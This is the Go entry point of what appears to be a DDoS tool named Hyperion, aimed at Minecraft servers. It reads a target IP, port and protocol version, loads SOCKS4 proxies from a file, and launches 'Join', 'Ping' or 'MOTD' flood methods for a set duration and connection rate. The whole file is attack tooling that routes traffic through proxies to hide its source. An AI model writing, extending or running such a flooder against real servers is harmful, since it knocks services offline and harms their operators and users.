package main

import (
	"Hyperion/core"
	"Hyperion/core/method"
	"Hyperion/core/method/methods"
	"Hyperion/core/proxy"
	"flag"
	"log"
	"time"
)

var (
	ip       = flag.String("ip", "0.0.0.0", "sets ip")
	port     = flag.Int("port", 25565, "sets port")
	protocol = flag.Int("protcol", 761, "sets version protocol")
	duration = flag.Int("duration", 600, "duration in sec")
	perDelay = flag.Int("perDelay", 100, "connecion per delay")
	delay    = flag.Int("delay", 0, "delay in sec")
)

func main() {

	flag.Parse()
	registerMethod()

	proxyManager := proxy.ProxyManager{}
	err := proxy.LoadFromFile(proxy.SOCKS4, "socks4.txt", &proxyManager)
	if err != nil {
		log.Fatal(err)
	}

	dialPool := proxy.DialPool{}
	dialPool.AddFromProxyManager(&proxyManager)

	method := methods.Join{}

	method.Start(

		&core.AttackInfo{
			Ip:       *ip,
			Port:     *port,
			Protocol: *protocol,
			Duration: time.Duration(*duration) * time.Second,
			PerDelay: *perDelay,
			Delay:    time.Duration(*delay),
		},

		&dialPool,
	)
}

func registerMethod() {
	method.RegisterMethod(methods.Join{})
	method.RegisterMethod(methods.Ping{})
	method.RegisterMethod(methods.MOTD{})
}
